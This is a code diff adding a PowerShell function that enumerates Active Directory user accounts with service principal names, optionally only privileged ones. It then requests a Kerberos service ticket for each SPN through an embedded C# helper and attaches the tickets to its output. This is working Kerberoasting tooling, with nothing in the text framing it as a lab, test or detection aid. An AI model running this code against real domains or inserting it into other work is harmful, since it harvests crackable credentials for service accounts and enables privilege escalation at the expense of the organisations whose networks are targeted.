@@ -79,3 +79,97 @@ public class K {
     }
 }
 "@
+
+function Get-AdServiceAccountsV2 {
+    [CmdletBinding()]
+    Param(
+        [string[]] $Identity,
+        [switch]   $AdminsOnly,
+        [string]   $Domain,
+        [string]   $LdapFilter,
+        [string]   $Scope = 'Subtree',
+        [int]      $PageSize = 200,
+        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
+    )
+
+    $dnsDomain = if ($Domain) { $Domain } else { $env:USERDNSDOMAIN }
+    if (-not $dnsDomain) { throw "Could not resolve DNS domain. Provide -Domain." }
+    $baseDn = "DC=$($dnsDomain -replace '\.',',DC=')"
+    $ldapPath = "LDAP://$baseDn"
+
+    $de = if ($Credential -eq [Management.Automation.PSCredential]::Empty) {
+        New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
+    } else {
+        New-Object System.DirectoryServices.DirectoryEntry($ldapPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+    }
+
+    $idOr = ''
+    if ($Identity) {
+        foreach ($n in $Identity) {
+            if ($n -match '^S-1-')      { $idOr += "(objectSid=$n)" }
+            elseif ($n -match '^CN=')   { $idOr += "(distinguishedName=$n)" }
+            elseif ($n -match '^[0-9a-fA-F-]{32,}$') { $idOr += "(objectGuid=$n)" }
+            else                        { $idOr += "(sAMAccountName=$n)" }
+        }
+        if ($idOr) { $idOr = "(|$idOr)" }
+    }
+
+    $filter  = "(&(samAccountType=805306368)(servicePrincipalName=*)"
+    if ($idOr)      { $filter += $idOr }
+    if ($AdminsOnly){ $filter += "(adminCount=1)" }
+    if ($LdapFilter){ $filter += $LdapFilter }
+    $filter += ")"
+
+    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
+    $ds.PageSize     = $PageSize
+    $ds.SearchScope  = $Scope
+    $ds.CacheResults = $false
+    $ds.Filter       = $filter
+
+    $props = @('distinguishedName','sAMAccountName','servicePrincipalName','objectSid','objectGuid','pwdLastSet','lastLogonTimestamp','userPrincipalName','memberOf')
+    foreach ($p in $props) { [void]$ds.PropertiesToLoad.Add($p) }
+
+    try {
+        $results = $ds.FindAll()
+        foreach ($r in $results) {
+            $z = $r.Properties
+            $obj = New-Object PSObject
+            $obj | Add-Member NoteProperty SamAccountName        ($z['samaccountname'][0])
+            $obj | Add-Member NoteProperty DistinguishedName     ($z['distinguishedname'][0])
+            $obj | Add-Member NoteProperty UserPrincipalName     ($z['userprincipalname'][0])
+            $obj | Add-Member NoteProperty ServicePrincipalName  ($z['serviceprincipalname'])
+
+            if ($z['objectsid']) {
+                $obj | Add-Member NoteProperty ObjectSid (New-Object System.Security.Principal.SecurityIdentifier($z['objectsid'][0],0)).Value
+            }
+            if ($z['objectguid']) {
+                $guid = New-Object Guid (,$z['objectguid'][0])
+                $obj | Add-Member NoteProperty ObjectGuid $guid.Guid
+            }
+            if ($z['pwdlastset']) {
+                $obj | Add-Member NoteProperty PwdLastSet ([datetime]::FromFileTime([int64]$z['pwdlastset'][0]))
+            }
+            if ($z['lastlogontimestamp']) {
+                $obj | Add-Member NoteProperty LastLogonTimestamp ([datetime]::FromFileTime([int64]$z['lastlogontimestamp'][0]))
+            }
+
+            # Attempt to retrieve ticket
+            if ($z['serviceprincipalname']) {
+                foreach ($spn in $z['serviceprincipalname']) {
+                    try {
+                        $ticket = [K]::GetTicket($spn)
+                        if ($ticket -and $ticket.Length -gt 0) {
+                            $obj | Add-Member NoteProperty KerberosTicket $ticket
+                        }
+                    } catch { }
+                }
+            }
+
+            $obj
+        }
+    } finally {
+        if ($ds) { $ds.Dispose() }
+        if ($de) { $de.Dispose() }
+        if ($results) { $results.Dispose() }
+    }
+}
